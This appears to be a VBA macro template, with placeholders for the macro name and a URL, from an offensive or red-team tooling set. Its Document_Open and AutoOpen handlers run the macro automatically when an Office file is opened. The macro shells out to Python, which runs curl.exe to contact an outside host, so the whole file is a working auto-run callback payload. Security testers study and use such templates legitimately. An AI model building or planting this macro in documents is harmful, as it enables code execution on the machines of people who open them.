Sub {MACRO_NAME}()
    Dim str As String
    str = "python -c ""import os; os.system('curl.exe {HTTP_URL}/___hello_from_vbaShell_via_python_curl')"" "
    Shell str, vbNormalFocus
End Sub

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub